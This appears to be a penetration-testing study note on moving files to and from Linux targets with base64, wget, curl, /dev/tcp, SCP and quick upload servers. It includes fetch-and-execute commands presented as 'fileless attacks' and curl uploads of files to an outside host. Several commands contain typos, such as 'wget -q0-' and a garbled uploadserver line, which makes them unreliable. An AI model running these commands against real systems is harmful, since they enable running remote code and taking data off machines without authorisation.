# Download operations

### Base64 Encoding/Decoding

#### Check File MD5 hash
- `md5sum <file_name>`
- To encode file to base64 
	- `cat <file_name> | base64 -w 0; echo`
	
	1. ==cat== command is used to print file content
	2. ==base64== is used to encode the contents of `file_name`.
	3. ==-w 0== is used to create only one line output.
	4. ==echo== is used to start a new line and make it easier to copy.

- To decode:
	- `echo -n 'encoded_value' | base64 -d > <file_name>`

### Web Download with Wget and cURL

#### Download a File Using wget 

- `wget <URL> -O <linux_file_path>`
- `curl -o <linux_file_path> <URL>`

## Fileless Attack Using Linux:

1. ==***Pipe Operator***== can be used that allow user to executes the file without downloading.

- By Using cURL
	- `curl <URL> | bash` 
- By Using wget
	- `wget -q0- <URL> | python3`

***{Based on the file_extension the executor is defined}***

## Download with Bash (/dev/tcp)

- If all the well-known file transfer tools fails to transfer file.
- Bash version 2.04 or greater allow file transfer by using built /dev/TCP device that allow user for simple Downloads.

- ###### Connect to the Target Webserver

	- `exec 3>/dev/tcp/<target/port>`

- ###### HTTP GET Request 
	
	- `echo -e "GET /<file_name> HTTP/1.1\n\n">&3`

- ###### Print the Response
	
	- cat <&3

## SSH Downloads

- SSH (Secure Shell) a protocol that allows secure to remote computers.
- SSH implementation with an ***SCP*** utility for remote file transfer.
- ==SCP== (secure copy) is a command line utility that allow users to copy files and directories between two host securely.

##### Enabling the SSH server

- `system enable ssh`
##### Starting the SSH server

- `systemctl start ssh`

##### For checking SSH listening port

- `netstat -lnpt`

## Linux - Downloading Files Using SCP

- `scp plaintext@<IP:>/<file_path> .`

## Upload Operations

### Web Upload

- Use ==uploadsever==, an extended module of the python HTTP.Server module, which includes a file upload page.
	- ###### Installation:
	
		- `python3 -m pip install --user uploadserver` 
	
	- ###### Create a Self-Signed certificate:
	
		- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
		
	- ###### Start Web Server:
	
		- `mkdir https && cd https`
		
		- `python3 -m uploadserver 433 --server-certificate session ~/server.pem`

	- ##### Linux - Upload multiple Files:
		
		- `curl -X POST https://<IP>/upload -F 'files=@<File_path>' -F 'files=@<File_path>' --insecure`
		
		- `--insecure` is used as a self-signed certificate that we trust.
## Alternative Web File Transfer Method:

- Since Linux distribution usually have python or php installed.
- So using these to transfer file is straightforward. 

- ##### Linux - Creating a webserver with Python3
	
	- `python3 -m http.server`

- ##### Linux - Creating a webserver with Python2.7

	- `python2.7 -m SimpleHTTPServer`

- #### Linux - Creating a Web Server with PHP

	- `php -S 0.0.0.0:<port>`

- #### Linux - Creating a Web Server with Ruby

	- `ruby -run -ehttpd . -p8000`

### Use wget to download from upload server.


## SCP Upload 

- Companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol

	- `scp <file_path> username@IP:<destination_file_path>` 

[[File Transfer]]